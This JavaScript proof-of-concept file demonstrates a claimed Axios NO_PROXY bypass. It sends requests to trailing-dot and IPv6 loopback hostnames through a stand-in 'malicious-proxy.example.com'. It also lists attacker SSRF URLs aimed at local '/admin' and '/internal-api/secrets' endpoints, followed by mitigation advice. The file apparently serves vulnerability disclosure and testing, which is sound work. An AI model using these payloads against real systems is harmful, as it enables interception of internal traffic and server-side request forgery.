/**
 * Axios NO_PROXY Bypass Vulnerability - Proof of Concept
 * 
 * This demonstrates how Axios fails to normalize hostnames when checking
 * NO_PROXY rules, allowing loopback addresses to be proxied when they shouldn't be.
 * 
 * CVE: TBD
 * Severity: Medium-High (SSRF/Proxy Bypass)
 */

const axios = require('axios');

// Simulate a proxy server (in real scenario, this could be a malicious proxy)
const PROXY_HOST = 'malicious-proxy.example.com';
const PROXY_PORT = 8888;

// Set NO_PROXY environment variable to protect localhost
process.env.NO_PROXY = 'localhost,127.0.0.1';

// Configure Axios with a proxy
const axiosWithProxy = axios.create({
  proxy: {
    host: PROXY_HOST,
    port: PROXY_PORT
  }
});

console.log('='.repeat(70));
console.log('Axios NO_PROXY Bypass Vulnerability - Proof of Concept');
console.log('='.repeat(70));
console.log(`\nNO_PROXY setting: ${process.env.NO_PROXY}`);
console.log(`Configured proxy: ${PROXY_HOST}:${PROXY_PORT}\n`);

/**
 * Test 1: Normal localhost request (EXPECTED: bypasses proxy)
 */
async function test1_normalLocalhost() {
  console.log('Test 1: Request to http://localhost:8080/');
  console.log('Expected: Should bypass proxy (NO_PROXY contains "localhost")');
  
  try {
    const response = await axiosWithProxy.get('http://localhost:8080/', {
      timeout: 1000
    });
    console.log('✓ Request bypassed proxy (as expected)');
  } catch (error) {
    if (error.code === 'ECONNREFUSED') {
      console.log('✓ Request bypassed proxy - connection refused by localhost:8080');
    } else if (error.code === 'ECONNRESET' || error.message.includes('proxy')) {
      console.log('✗ Request went through proxy (UNEXPECTED!)');
    } else {
      console.log(`Error: ${error.message}`);
    }
  }
  console.log('');
}

/**
 * Test 2: localhost with trailing dot (VULNERABILITY!)
 */
async function test2_localhostWithDot() {
  console.log('Test 2: Request to http://localhost.:8080/');
  console.log('Expected: Should bypass proxy (RFC 1034 §3.1 - equivalent to localhost)');
  console.log('Actual: Will go through proxy due to literal string comparison');
  
  try {
    const response = await axiosWithProxy.get('http://localhost.:8080/', {
      timeout: 1000
    });
    console.log('Request completed');
  } catch (error) {
    if (error.code === 'ECONNREFUSED') {
      console.log('✓ Request bypassed proxy');
    } else if (error.code === 'ENOTFOUND' || error.message.includes('proxy') || 
               error.message.includes('getaddrinfo')) {
      console.log('✗ VULNERABILITY CONFIRMED: Request went through proxy!');
      console.log('   localhost. should be treated as localhost but was proxied.');
    } else {
      console.log(`Error: ${error.message}`);
    }
  }
  console.log('');
}

/**
 * Test 3: IPv6 loopback literal (VULNERABILITY!)
 */
async function test3_ipv6Loopback() {
  console.log('Test 3: Request to http://[::1]:8080/');
  console.log('Expected: Should bypass proxy (::1 is IPv6 loopback)');
  console.log('Actual: Will go through proxy - not in NO_PROXY list');
  
  try {
    const response = await axiosWithProxy.get('http://[::1]:8080/', {
      timeout: 1000
    });
    console.log('Request completed');
  } catch (error) {
    if (error.code === 'ECONNREFUSED') {
      console.log('✓ Request bypassed proxy');
    } else if (error.message.includes('proxy') || error.code === 'ENOTFOUND') {
      console.log('✗ VULNERABILITY CONFIRMED: Request went through proxy!');
      console.log('   ::1 is IPv6 loopback but was not recognized.');
    } else {
      console.log(`Error: ${error.message}`);
    }
  }
  console.log('');
}

/**
 * Test 4: 127.0.0.1 with trailing dot (VULNERABILITY!)
 */
async function test4_ipWithDot() {
  console.log('Test 4: Request to http://127.0.0.1.:8080/');
  console.log('Expected: Should bypass proxy (equivalent to 127.0.0.1)');
  console.log('Actual: Will go through proxy due to literal string comparison');
  
  try {
    const response = await axiosWithProxy.get('http://127.0.0.1.:8080/', {
      timeout: 1000
    });
    console.log('Request completed');
  } catch (error) {
    if (error.code === 'ECONNREFUSED') {
      console.log('✓ Request bypassed proxy');
    } else if (error.message.includes('proxy') || error.code === 'ENOTFOUND') {
      console.log('✗ VULNERABILITY CONFIRMED: Request went through proxy!');
      console.log('   127.0.0.1. should be treated as 127.0.0.1 but was proxied.');
    } else {
      console.log(`Error: ${error.message}`);
    }
  }
  console.log('');
}

/**
 * Attack Scenario Demo
 */
async function attackScenario() {
  console.log('='.repeat(70));
  console.log('ATTACK SCENARIO: SSRF via Proxy Bypass');
  console.log('='.repeat(70));
  console.log('\nScenario: Attacker controls a URL parameter in the application');
  console.log('Application has NO_PROXY set to protect internal services\n');
  
  const maliciousUrls = [
    'http://localhost.:8080/admin',
    'http://[::1]:8080/admin',
    'http://127.0.0.1.:8080/admin',
    'http://localhost./internal-api/secrets'
  ];
  
  console.log('Attacker-supplied URLs that bypass NO_PROXY:');
  maliciousUrls.forEach((url, idx) => {
    console.log(`  ${idx + 1}. ${url}`);
  });
  
  console.log('\nImpact:');
  console.log('  - Requests to protected loopback services are proxied');
  console.log('  - Proxy can intercept/modify sensitive data');
  console.log('  - SSRF to internal services via proxy');
  console.log('  - Bypass of security controls relying on NO_PROXY\n');
}

// Run all tests
(async () => {
  await test1_normalLocalhost();
  await test2_localhostWithDot();
  await test3_ipv6Loopback();
  await test4_ipWithDot();
  await attackScenario();
  
  console.log('='.repeat(70));
  console.log('MITIGATION RECOMMENDATIONS:');
  console.log('='.repeat(70));
  console.log('1. Normalize hostnames before NO_PROXY comparison:');
  console.log('   - Strip trailing dots from hostnames');
  console.log('   - Resolve IPv6 literals to canonical form');
  console.log('   - Compare loopback addresses (localhost, 127.0.0.1, ::1) as equivalent');
  console.log('\n2. Update Axios to latest version (once patched)');
  console.log('\n3. Add explicit NO_PROXY entries:');
  console.log('   NO_PROXY=localhost,localhost.,127.0.0.1,127.0.0.1.,::1,[::1]');
  console.log('\n4. Validate/sanitize user-supplied URLs to reject variants\n');
})();
